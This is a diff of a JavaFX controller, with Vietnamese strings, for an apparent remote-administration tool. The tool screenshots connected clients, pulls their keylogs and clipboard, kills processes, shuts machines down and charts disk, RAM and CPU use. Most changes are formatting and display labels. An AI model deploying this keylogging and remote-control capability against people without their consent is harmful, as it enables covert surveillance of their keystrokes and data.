@@ -50,7 +50,7 @@ public class HelloController implements Initializable {
     public TabPane tabPane;
     public Tab ProcessPane;
     public TableView<ProcessModel> Processtable;
-    public TableColumn<ProcessModel,String> ProcessNameColumn;
+    public TableColumn<ProcessModel, String> ProcessNameColumn;
     public TableColumn<ProcessModel, Integer> ProcessPIDColumn;
     public TableColumn<ProcessModel, String> ProcessMemoryColumn;
     public TableView<DiskModel> Disktable;
@@ -75,12 +75,14 @@ public class HelloController implements Initializable {
     public static HashMap<String, String> KeylogHash;
     public static ObservableList<ProcessModel> listProcess;
     public static ObservableList<DiskModel> listDisk;
+    public static boolean isSTOPCPU;
+
     //Take Screen Shot
     @FXML
     protected void onHelloButtonClick() {
         try {
             String input = table.getSelectionModel().getSelectedItem();
-            if(input==null||!input.contains("client")){
+            if (input == null || !input.contains("client")) {
                 return;
             }
             Message object = new Message();
@@ -90,7 +92,7 @@ public class HelloController implements Initializable {
             Client.dos.writeObject(object);
             try {
                 Message msg = (Message) Client.dis.readObject();
-                if(msg.data.equals("error"))
+                if (msg.data.equals("error"))
                     return;
                 BufferedImage image = base64StringToImg(msg.data);
                 int h = image.getHeight();
@@ -169,7 +171,29 @@ public class HelloController implements Initializable {
         }
         DiskNameColumn.setCellValueFactory(new PropertyValueFactory<>("name"));
         DiskUsedColumn.setCellValueFactory(new PropertyValueFactory<>("used"));
+        DiskUsedColumn.setCellFactory(column-> new TableCell<>(){
+            @Override
+            protected void updateItem(Double item, boolean empty) {
+                super.updateItem(item, empty);
+                if (empty) {
+                    setText(null);
+                } else {
+                    setText(String.format("%.2f",item/1073741824) + "GiB");
+                }
+            }
+        });
         DiskAvailableColumn.setCellValueFactory(new PropertyValueFactory<>("available"));
+        DiskAvailableColumn.setCellFactory(column-> new TableCell<>(){
+            @Override
+            protected void updateItem(Double item, boolean empty) {
+                super.updateItem(item, empty);
+                if (empty) {
+                    setText(null);
+                } else {
+                    setText(String.format("%.2f",item/1073741824) + " GiB");
+                }
+            }
+        });
         PercentColumn.setCellValueFactory(new PropertyValueFactory<>("percent"));
         pcName.setCellValueFactory(cellData ->
                 new ReadOnlyStringWrapper(cellData.getValue()));
@@ -188,7 +212,7 @@ public class HelloController implements Initializable {
             object.toId = "all";
             Client.dos.writeObject(object);
             Message msg = (Message) Client.dis.readObject();
-            if(msg.data.equals("error"))
+            if (msg.data.equals("error"))
                 return;
             listClient = FXCollections.observableList(listSIModeltoJson(msg.data));
             table.setItems(listClient);
@@ -197,16 +221,19 @@ public class HelloController implements Initializable {
         }
     }
 
-    public static String listSIModeltoJson(List<String> list){
-        Type listType = new TypeToken<List<String>>() {}.getType();
-        return new Gson().toJson(list,listType);
-    }
-    public static List<String> listSIModeltoJson(String json){
-        Type listType = new TypeToken<List<String>>() {}.getType();
-        return new Gson().fromJson(json,listType);
+    public static String listSIModeltoJson(List<String> list) {
+        Type listType = new TypeToken<List<String>>() {
+        }.getType();
+        return new Gson().toJson(list, listType);
     }
 
-    private static  BufferedImage resize(BufferedImage src, int h, int w) {
+    public static List<String> listSIModeltoJson(String json) {
+        Type listType = new TypeToken<List<String>>() {
+        }.getType();
+        return new Gson().fromJson(json, listType);
+    }
+
+    private static BufferedImage resize(BufferedImage src, int h, int w) {
         if (h * w <= 0) {
             return src; //this can't be resized
         }
@@ -228,20 +255,20 @@ public class HelloController implements Initializable {
 
     public void onTableClick() {
         String index = table.getSelectionModel().getSelectedItem();
-        if(index == null||!index.contains("client")){
+        if (index == null || !index.contains("client")) {
             return;
         }
         tabPane.getSelectionModel().selectFirst();
         String keylog = onGetKeyLog();
-        if(OShash.containsKey(index)){
+        if (OShash.containsKey(index)) {
             OsHWModel os = OShash.get(index);
             OsName.setText(os.getOSPreFix());
             CPUText.setText(os.getProc());
             Display.setText(os.getDisplay());
-            KeylogHash.put(index,KeylogHash.get(index)+keylog);
+            KeylogHash.put(index, KeylogHash.get(index) + keylog);
             keyLogerLabel.setText(KeylogHash.get(index));
-        }else{
-            KeylogHash.put(index,keylog);
+        } else {
+            KeylogHash.put(index, keylog);
             keyLogerLabel.setText(KeylogHash.get(index));
         }
         try {
@@ -251,7 +278,7 @@ public class HelloController implements Initializable {
             object.toId = index;
             Client.dos.writeObject(object);
             Message msg = (Message) Client.dis.readObject();
-            if(msg.data.equals("error")){
+            if (msg.data.equals("error")) {
                 OsName.setText("");
                 CPUText.setText("");
                 Display.setText("");
@@ -264,18 +291,18 @@ public class HelloController implements Initializable {
             try {
                 Client.dos.writeObject(object1);
                 Message msg1 = (Message) Client.dis.readObject();
-                if(msg.data.equals("error"))
+                if (msg.data.equals("error"))
                     return;
-                MemoryModel m = new Gson().fromJson(msg1.data,MemoryModel.class);
+                MemoryModel m = new Gson().fromJson(msg1.data, MemoryModel.class);
                 Ramlabel.setText(m.getPhysicalMemoryInfo());
             } catch (IOException | ClassNotFoundException e) {
                 System.err.println("Lỗi ghê á, CPU");
             }
-            OsHWModel os = new Gson().fromJson(msg.data,OsHWModel.class);
+            OsHWModel os = new Gson().fromJson(msg.data, OsHWModel.class);
             OsName.setText(os.getOSPreFix());
             CPUText.setText(os.getProc());
             Display.setText(os.getDisplay());
-            OShash.put(index,os);
+            OShash.put(index, os);
         } catch (IOException | ClassNotFoundException e) {
             e.printStackTrace();
         }
@@ -283,7 +310,7 @@ public class HelloController implements Initializable {
 
     public void logOutUser() {
         String index = table.getSelectionModel().getSelectedItem();
-        if(index == null||!index.contains("client")){
+        if (index == null || !index.contains("client")) {
             return;
         }
         Message object = new Message();
@@ -296,9 +323,10 @@ public class HelloController implements Initializable {
             System.err.println("Lỗi ghê á LogOutUser");
         }
     }
+
     public void shutDownUser() {
         String index = table.getSelectionModel().getSelectedItem();
-        if(index == null||!index.contains("client")){
+        if (index == null || !index.contains("client")) {
             return;
         }
         Message object = new Message();
@@ -314,7 +342,7 @@ public class HelloController implements Initializable {
 
     public void getClipBoardAction() {
         String index = table.getSelectionModel().getSelectedItem();
-        if(index == null||!index.contains("client")){
+        if (index == null || !index.contains("client")) {
             return;
         }
         Message object = new Message();
@@ -324,7 +352,7 @@ public class HelloController implements Initializable {
         try {
             Client.dos.writeObject(object);
             Message msg = (Message) Client.dis.readObject();
-            if(msg.data.equals("error")){
+            if (msg.data.equals("error")) {
                 Alert alert = new Alert(Alert.AlertType.INFORMATION);
                 alert.setHeaderText("");
                 alert.setContentText("Người dùng đã bị ngắt kết nối");
@@ -344,7 +372,7 @@ public class HelloController implements Initializable {
 
     public void getNewProcess() {
         String index = table.getSelectionModel().getSelectedItem();
-        if(index == null||!index.contains("client")){
+        if (index == null || !index.contains("client")) {
             return;
         }
         Message object = new Message();
@@ -354,7 +382,7 @@ public class HelloController implements Initializable {
         try {
             Client.dos.writeObject(object);
             Message msg = (Message) Client.dis.readObject();
-            if(msg.data.equals("error"))
+            if (msg.data.equals("error"))
                 return;
             listProcess = FXCollections.observableList(getProcessfromJson(msg.data));
             Processtable.setItems(listProcess);
@@ -365,16 +393,16 @@ public class HelloController implements Initializable {
 
     public void killProcess() {
         String index = table.getSelectionModel().getSelectedItem();
-        if(index == null||!index.contains("client")){
+        if (index == null || !index.contains("client")) {
             return;
         }
         ProcessModel process = Processtable.getSelectionModel().getSelectedItem();
-        if(process==null){
+        if (process == null) {
             return;
         }
         Message object = new Message();
         object.command = Message.KILL_PROCESS;
-        object.data = ""+process.getPID();
+        object.data = "" + process.getPID();
         object.toId = index;
         try {
             Client.dos.writeObject(object);
@@ -387,10 +415,10 @@ public class HelloController implements Initializable {
     public void onSelectionChanged() {
 
         String index = table.getSelectionModel().getSelectedItem();
-        if(index == null||!index.contains("client")){
+        if (index == null || !index.contains("client")) {
             return;
         }
-        if(ProcessPane.isSelected()){
+        if (ProcessPane.isSelected()) {
             Message object = new Message();
             object.command = Message.GET_LIST_PROCESS;
             object.data = "";
@@ -398,7 +426,7 @@ public class HelloController implements Initializable {
             try {
                 Client.dos.writeObject(object);
                 Message msg = (Message) Client.dis.readObject();
-                if(msg.data.equals("error"))
+                if (msg.data.equals("error"))
                     return;
                 listProcess = FXCollections.observableList(getProcessfromJson(msg.data));
                 Processtable.setItems(listProcess);
@@ -406,7 +434,7 @@ public class HelloController implements Initializable {
                 System.err.println("Lỗi ghê á getProcess");
             }
         }
-        if(DiskPane.isSelected()){
+        if (DiskPane.isSelected()) {
             Message object = new Message();
             object.command = Message.GET_DISK;
             object.data = "";
@@ -414,7 +442,7 @@ public class HelloController implements Initializable {
             try {
                 Client.dos.writeObject(object);
                 Message msg = (Message) Client.dis.readObject();
-                if(msg.data.equals("error"))
+                if (msg.data.equals("error"))
                     return;
                 listDisk = FXCollections.observableList(DiskModel.fromJson(msg.data));
                 Disktable.setItems(listDisk);
@@ -422,7 +450,7 @@ public class HelloController implements Initializable {
                 System.err.println("Lỗi ghê á getProcess");
             }
         }
-        if(RamPane.isSelected()){
+        if (RamPane.isSelected()) {
             Message object = new Message();
             object.command = Message.GET_RAM;
             object.data = "";
@@ -430,13 +458,15 @@ public class HelloController implements Initializable {
             try {
                 Client.dos.writeObject(object);
                 Message msg = (Message) Client.dis.readObject();
-                if(msg.data.equals("error"))
+                if (msg.data.equals("error"))
                     return;
-                MemoryModel m = new Gson().fromJson(msg.data,MemoryModel.class);
-                PieChart.Data sliceR = new PieChart.Data("Ram used", Double.parseDouble(m.getPhysicalMemoryUsed()));
-                PieChart.Data sliceR1 = new PieChart.Data("Ram available", Double.parseDouble(m.getPhysicalMemoryAvailable()));
-                PieChart.Data sliceV = new PieChart.Data("VRam used", Double.parseDouble(m.getVirtualMemoryUsed()));
-                PieChart.Data sliceV1 = new PieChart.Data("VRam available", Double.parseDouble(m.getVirtualMemoryAvailable()));
+                MemoryModel m = new Gson().fromJson(msg.data, MemoryModel.class);
+                double RamUsed = Double.parseDouble(m.getPhysicalMemoryUsed())/ (Double.parseDouble(m.getPhysicalMemoryUsed())+ Double.parseDouble(m.getPhysicalMemoryAvailable()));
+                PieChart.Data sliceR = new PieChart.Data("Ram used \n" + String.format("%.2f",RamUsed*100) + " %", Double.parseDouble(m.getPhysicalMemoryUsed()));
+                PieChart.Data sliceR1 = new PieChart.Data("Ram available \n" + String.format("%.2f",100 - (RamUsed*100)) + " %", Double.parseDouble(m.getPhysicalMemoryAvailable()));
+                double VRamUsed = Double.parseDouble(m.getVirtualMemoryUsed())/ (Double.parseDouble(m.getVirtualMemoryUsed())+ Double.parseDouble(m.getVirtualMemoryAvailable()));
+                PieChart.Data sliceV = new PieChart.Data("VRam used \n" + String.format("%.2f",VRamUsed*100) + " %", Double.parseDouble(m.getVirtualMemoryUsed()));
+                PieChart.Data sliceV1 = new PieChart.Data("VRam available \n" + String.format("%.2f",100 - (VRamUsed*100)) + " %", Double.parseDouble(m.getVirtualMemoryAvailable()));
                 RamChart.setTitle("Ram memory");
                 RamChart.getData().clear();
                 RamChart.getData().add(sliceR);
@@ -449,36 +479,41 @@ public class HelloController implements Initializable {
                 System.err.println("Lỗi ghê á getProcess");
             }
         }
-//        if(CpuPane.isSelected()){
-//            Message object = new Message();
-//            object.command = Message.GET_CPU;
-//            object.data = "";
-//            object.toId = index;
-//            try {
-//                Client.dos.writeObject(object);
-//                Message msg = (Message) Client.dis.readObject();
-//                System.out.println(msg.command);
-//                if(msg.data.equals("error"))
-//                    return;
-//                System.out.println(msg);
-//            } catch (IOException | ClassNotFoundException e) {
-//                System.err.println("Lỗi ghê á getProcess");
-//            }
-//        }
+        if (CpuPane.isSelected()) {
+            Message object = new Message();
+            object.command = Message.GET_CPU;
+            object.data = "";
+            object.toId = index;
+            try {
+                Client.dos.writeObject(object);
+                Message msg = (Message) Client.dis.readObject();
+                if (msg.data.equals("error"))
+                    return;
+                PieChart.Data sliceR = new PieChart.Data("CPU used \n" +  String.format("%.2f ",Double.parseDouble(msg.data)) +" %", Double.parseDouble(msg.data));
+                PieChart.Data sliceR1 = new PieChart.Data("CPU available \n"  +  String.format("%.2f ", 100 -Double.parseDouble(msg.data)) +" %", 100 - Double.parseDouble(msg.data));
+                CPUChart.getData().clear();
+                CPUChart.getData().add(sliceR);
+                CPUChart.getData().add(sliceR1);
+            } catch (IOException | ClassNotFoundException e) {
+                System.err.println("Lỗi ghê á getProcess");
+            }
+        }
     }
-    public static List<ProcessModel> getProcessfromJson(String json){
-            Type listType = new TypeToken<List<ProcessModel>>() {}.getType();
-            return new Gson().fromJson(json,listType);
+
+    public static List<ProcessModel> getProcessfromJson(String json) {
+        Type listType = new TypeToken<List<ProcessModel>>() {
+        }.getType();
+        return new Gson().fromJson(json, listType);
     }
 
     public void onDiskSelection() {
         DiskModel model = Disktable.getSelectionModel().getSelectedItem();
-        if(model==null){
+        if (model == null) {
             return;
         }
-        PieChart.Data used = new PieChart.Data("Đã sử dụng",model.getUsed());
-        PieChart.Data avail = new PieChart.Data("Còn lại",model.getAvailable());
-        DiskChart.setTitle(model.getName());
+        PieChart.Data used = new PieChart.Data("Đã sử dụng: \n" +model.getPercent() + "%", model.getUsed());
+        PieChart.Data avail = new PieChart.Data("Còn lại: \n" +String.format("%.2f ", 100-Double.parseDouble(model.getPercent())) +"%", model.getAvailable());
+        DiskChart.setTitle(model.getName() + String.format(": %.2f ",(model.getUsed() + model.getAvailable())/1073741824) + "GiB");
         DiskChart.getData().clear();
         DiskChart.getData().add(used);
         DiskChart.getData().add(avail);
@@ -486,7 +521,7 @@ public class HelloController implements Initializable {
 
     public String onGetKeyLog() {
         String index = table.getSelectionModel().getSelectedItem();
-        if(index == null||!index.contains("client")){
+        if (index == null || !index.contains("client")) {
             return "";
         }
         Message object = new Message();
@@ -496,7 +531,7 @@ public class HelloController implements Initializable {
         try {
             Client.dos.writeObject(object);
             Message msg = (Message) Client.dis.readObject();
-            if(msg.data.equals("error")){
+            if (msg.data.equals("error")) {
 //                keyLogerLabel.setText("Người dùng đã ngắt kết nối");
                 return "";
             }
